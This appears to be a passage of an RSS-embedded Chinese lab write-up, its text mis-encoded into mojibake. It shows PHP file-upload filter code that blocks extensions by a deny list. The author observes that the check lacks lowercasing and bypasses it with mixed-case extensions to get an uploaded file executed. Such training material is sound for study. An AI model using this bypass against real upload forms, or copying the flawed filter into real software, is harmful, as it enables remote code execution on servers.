&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//å»é™¤å­—ç¬¦ä¸²::$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//é¦–å°¾å»ç©º
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;9999&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ ç»†å¿ƒçš„è¯å¯ä»¥å‘ç°ï¼Œè¿™é“é¢˜çš„æºç ä¸­åœ¨æœ«å°¾æ·»åŠ äº†&lt;code&gt;.htaccess&lt;/code&gt;æ–‡ä»¶è¿‡æ»¤ï¼Œä½†æ˜¯ä¹Ÿå°‘äº†ä¸€æ¡è¯­å¥&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//è½¬æ¢ä¸ºå°å†™
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œç›´æ¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡è¿‡æ»¤ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTLmNj.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ‰“å¼€å›¾ç‰‡æˆåŠŸæ‰§è¡Œã€‚å®Œå·¥&lt;/p&gt;</description></item></channel></rss>